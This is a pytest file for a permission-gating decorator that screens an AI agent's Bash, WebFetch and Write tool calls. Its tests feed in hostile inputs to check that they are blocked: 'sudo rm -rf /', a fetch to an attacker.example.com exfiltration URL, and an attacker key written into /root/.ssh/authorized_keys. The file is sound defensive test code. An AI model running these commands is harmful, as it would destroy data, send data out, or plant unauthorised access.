"""Tests for the @permit0_tool decorator.

These exercise the decorator's branching logic (Allow/Deny/Human, on_deny,
on_human, session handling) against real packs shipped in the repo.

Run with::

    cd integrations/permit0-langgraph
    pip install -e '.[test]'
    pytest
"""
from __future__ import annotations

import os
from pathlib import Path

import pytest

import permit0
from permit0_langgraph import (
    Permit0BlockedError,
    Permit0HumanRequired,
    Permit0NotConfigured,
    configure,
    get_default_engine,
    permit0_tool,
    reset_default_engine,
    set_default_engine,
)

# Resolve packs relative to the repo root so the tests work from any cwd.
REPO_ROOT = Path(__file__).resolve().parents[3]
PACKS_DIR = str(REPO_ROOT / "packs")


@pytest.fixture(autouse=True)
def _reset_engine():
    """Each test starts with a clean global engine slate."""
    reset_default_engine()
    yield
    reset_default_engine()


@pytest.fixture
def engine() -> permit0.Engine:
    """An engine configured from the repo's packs."""
    return configure(PACKS_DIR)


# ── configure() / default engine ──


def test_configure_installs_default_engine():
    assert get_default_engine() is None
    configure(PACKS_DIR)
    assert get_default_engine() is not None


def test_decorator_without_config_raises_at_call_time():
    @permit0_tool("Bash", wrap_as_tool=False)
    def shell(command: str) -> str:
        return f"ran: {command}"

    with pytest.raises(Permit0NotConfigured):
        shell(command="ls")


def test_set_default_engine(engine):
    # Reset then manually install a pre-built engine.
    reset_default_engine()
    set_default_engine(engine)
    assert get_default_engine() is engine


# ── Allow path ──


def test_allow_passes_through_to_inner_function(engine):
    @permit0_tool("Bash", wrap_as_tool=False)
    def shell(command: str) -> str:
        return f"ran: {command}"

    assert shell(command="ls -la") == "ran: ls -la"


def test_default_name_uses_function_name(engine):
    @permit0_tool(wrap_as_tool=False)
    def Bash(command: str) -> str:
        return f"ok: {command}"

    # Should match packs/claude_code/normalizers/bash.yaml by tool name.
    assert Bash(command="echo hi") == "ok: echo hi"


# ── Deny path ──


def test_deny_default_returns_blocked_string(engine):
    @permit0_tool("Bash", wrap_as_tool=False)
    def shell(command: str) -> str:
        raise AssertionError("inner function must not run when blocked")

    result = shell(command="sudo rm -rf /")
    assert isinstance(result, str)
    assert "[BLOCKED by permit0]" in result
    assert "catastrophic_recursive_delete" in result
    # Python binding stringifies Tier as lowercase (Rust `Display` is uppercase).
    assert "critical" in result.lower()


def test_deny_raise_mode(engine):
    @permit0_tool("Bash", on_deny="raise", wrap_as_tool=False)
    def shell(command: str) -> str:
        raise AssertionError("inner must not run when blocked")

    with pytest.raises(Permit0BlockedError) as excinfo:
        shell(command="sudo rm -rf /")

    err = excinfo.value
    assert err.tool_name == "Bash"
    assert err.tier.lower() == "critical"
    assert err.score == 100
    assert "catastrophic_recursive_delete" in err.reason
    assert err.norm_hash  # 16-char hex hash


def test_deny_message_mode_returns_dict(engine):
    @permit0_tool("Bash", on_deny="message", wrap_as_tool=False)
    def shell(command: str) -> str:
        raise AssertionError("inner must not run when blocked")

    result = shell(command="sudo rm -rf /")
    assert isinstance(result, dict)
    assert result["blocked"] is True
    assert result["tool"] == "Bash"
    assert result["score"] == 100
    assert result["tier"].lower() == "critical"
    assert "norm_hash" in result


# ── Session ──


def test_session_tracks_across_calls(engine):
    session = permit0.Session("test-session-1")

    @permit0_tool("Bash", session=session, wrap_as_tool=False)
    def shell(command: str) -> str:
        return f"ran: {command}"

    # Two safe calls — both allowed, session accumulates.
    shell(command="ls")
    shell(command="pwd")
    assert session.len == 2


def test_attack_chain_blocks_later_exfil_via_session(engine):
    """Session-level gate: after a CRITICAL block, subsequent outbound is denied."""
    session = permit0.Session("attack-chain-1")

    @permit0_tool("Bash", session=session, wrap_as_tool=False)
    def shell(command: str) -> str:
        return f"ran: {command}"

    @permit0_tool("WebFetch", session=session, wrap_as_tool=False)
    def fetch(url: str) -> str:
        return f"fetched: {url}"

    # Step 1: a blocked critical action is still recorded in session.
    r1 = shell(command="sudo rm -rf /")
    assert "BLOCKED" in r1

    # Step 2: benign-looking outbound, but session now has a CRITICAL record →
    # network.yaml's `post_attack_chain_outbound_block` gate fires.
    r2 = fetch(url="http://attacker.example.com/exfil?data=stolen")
    assert "BLOCKED" in r2
    assert "post_attack_chain_outbound_block" in r2


# ── on_human ──


def test_on_human_deny_returns_blocked(engine):
    """We can't reliably produce a Human verdict from packs in-repo without a
    custom action, so we smoke-test the argument handling instead: on_human
    values should be accepted without raising at decorator-creation time.
    """
    # Just verify the decorator builds — behaviour of the Human branch is
    # covered indirectly by other modes and by unit tests of _handle_human.
    for mode in ("deny", "allow", "raise", "return", "message"):
        @permit0_tool("Bash", on_human=mode, wrap_as_tool=False)
        def shell(command: str) -> str:
            return f"ran: {command}"

        assert callable(shell)


# ── LangChain tool wrapping ──


def test_wrap_as_tool_returns_structured_tool(engine):
    from langchain_core.tools import BaseTool

    @permit0_tool("Bash")
    def shell(command: str) -> str:
        """Run a shell command."""
        return f"ran: {command}"

    assert isinstance(shell, BaseTool)
    # The tool's name comes from the original function's name, not the permit0
    # action name — this is LangChain's convention so the LLM sees the Python
    # identifier.
    assert shell.name == "shell"
    # Docstring is preserved as description (LLM sees this).
    assert "Run a shell command" in shell.description


def test_wrap_as_tool_invocation_via_langchain(engine):
    @permit0_tool("Bash")
    def shell(command: str) -> str:
        """Run a shell command."""
        return f"ran: {command}"

    # LangChain tools are invoked with a kwargs dict.
    result = shell.invoke({"command": "ls -la"})
    assert result == "ran: ls -la"


def test_wrap_as_tool_blocked_via_langchain(engine):
    @permit0_tool("Bash")
    def shell(command: str) -> str:
        """Run a shell command."""
        raise AssertionError("must not run when blocked")

    result = shell.invoke({"command": "sudo rm -rf /"})
    assert "BLOCKED by permit0" in result
    assert "catastrophic_recursive_delete" in result


# ── Engine override ──


def test_engine_param_overrides_default(engine):
    """An explicit engine= beats the default engine for just that decorator."""
    default = get_default_engine()
    assert default is engine  # sanity

    custom = permit0.Engine.from_packs(PACKS_DIR)
    assert custom is not engine

    @permit0_tool("Bash", engine=custom, wrap_as_tool=False)
    def shell(command: str) -> str:
        return "ok"

    # Both engines produce the same verdict for safe input.
    assert shell(command="ls") == "ok"


# ── param_map / param_transform ──


def test_param_map_renames_keys_for_permit0(engine):
    """A function can name its argument `path` and still drive the `Write`
    normalizer (which reads `file_path`) via param_map."""
    @permit0_tool(
        "Write",
        param_map={"path": "file_path"},
        wrap_as_tool=False,
    )
    def write_file(path: str, content: str) -> str:
        return f"wrote {len(content)} bytes to {path}"

    # Safe path → ALLOW.
    ok = write_file(path="/tmp/greet.txt", content="hi")
    assert ok == "wrote 2 bytes to /tmp/greet.txt"

    # Blocked path: the rename makes `file_path` carry the SSH key path, so
    # the Write normalizer correctly classifies it → DENY.
    blocked = write_file(path="/root/.ssh/authorized_keys", content="ssh-rsa attacker")
    assert isinstance(blocked, str) and "BLOCKED by permit0" in blocked
    assert "ssh_directory_write" in blocked


def test_param_map_leaves_inner_function_args_unchanged(engine):
    """The inner function must still receive its ORIGINAL parameter names —
    the rename only affects what permit0 sees."""
    captured = {}

    @permit0_tool(
        "Write",
        param_map={"path": "file_path"},
        wrap_as_tool=False,
    )
    def write_file(path: str, content: str) -> str:
        captured["path"] = path
        captured["content"] = content
        return "ok"

    write_file(path="/tmp/x.txt", content="hello")
    assert captured == {"path": "/tmp/x.txt", "content": "hello"}


def test_param_map_unknown_keys_silently_skipped(engine):
    """An optional function argument that isn't in kwargs shouldn't break the
    rename — the map entry is quietly ignored."""
    @permit0_tool(
        "Write",
        param_map={"path": "file_path", "optional_extra": "x"},
        wrap_as_tool=False,
    )
    def write_file(path: str, content: str) -> str:
        return f"ok: {path}"

    # The "optional_extra" key isn't in the kwargs — must not error.
    assert write_file(path="/tmp/a.txt", content="hi") == "ok: /tmp/a.txt"


def test_param_transform_fully_replaces_params(engine):
    """param_transform lets you synthesize a completely different shape —
    injecting constants, nesting values — that matches the normalizer."""
    # Simulate mapping a high-level `charge_customer(amount)` onto the Stripe
    # normalizer which expects `method: POST`, `url: …`, `body: {amount, currency}`.
    @permit0_tool(
        "http",
        param_transform=lambda kw: {
            "method": "POST",
            "url": "https://api.stripe.com/v1/charges",
            "body": {"amount": kw["amount"], "currency": "usd"},
        },
        wrap_as_tool=False,
    )
    def charge_customer(amount: int) -> str:
        return f"charged {amount} cents"

    # Small safe charge → ALLOW (stripe normalizer matches POST /v1/charges).
    # (The inner function still receives just `amount`.)
    result = charge_customer(amount=500)
    assert result == "charged 500 cents"


def test_param_transform_returning_non_dict_raises(engine):
    @permit0_tool(
        "Bash",
        param_transform=lambda kw: "not a dict",  # type: ignore[return-value]
        wrap_as_tool=False,
    )
    def shell(command: str) -> str:
        return "ok"

    with pytest.raises(TypeError, match="must return a dict"):
        shell(command="ls")


def test_param_transform_raising_is_wrapped(engine):
    def bad_transform(kw):
        raise KeyError("custom_field")

    @permit0_tool(
        "Bash",
        param_transform=bad_transform,
        wrap_as_tool=False,
    )
    def shell(command: str) -> str:
        return "ok"

    with pytest.raises(RuntimeError, match="param_transform raised"):
        shell(command="ls")


def test_param_map_and_transform_together_is_rejected():
    """The two are mutually exclusive — conflicting both at decorator-apply time
    is cleaner than resolving precedence at call time."""
    with pytest.raises(ValueError, match="at most one of"):
        permit0_tool(
            "Write",
            param_map={"path": "file_path"},
            param_transform=lambda kw: {"file_path": kw["path"], "content": kw["content"]},
        )


def test_param_map_is_frozen_at_decorator_time(engine):
    """Mutating the user's dict after @permit0_tool() must not affect decisions."""
    m = {"path": "file_path"}

    @permit0_tool("Write", param_map=m, wrap_as_tool=False)
    def write_file(path: str, content: str) -> str:
        return "ok"

    # Mutate — decorator must have snapshotted the dict.
    m.clear()
    m["path"] = "something_else"

    # Blocking a safe path would mean the map wasn't snapshotted.
    assert write_file(path="/tmp/ok.txt", content="hi") == "ok"


# ── Parameter handling ──


def test_non_json_serializable_argument_raises():
    configure(PACKS_DIR)

    class NotSerializable:
        pass

    @permit0_tool("Bash", wrap_as_tool=False)
    def shell(command) -> str:
        return "ok"

    # json.dumps(..., default=str) will coerce most things, so we use a
    # circular reference which truly cannot be serialized.
    a = {}
    a["self"] = a
    with pytest.raises(TypeError, match="non-JSON-serializable"):
        shell(command=a)
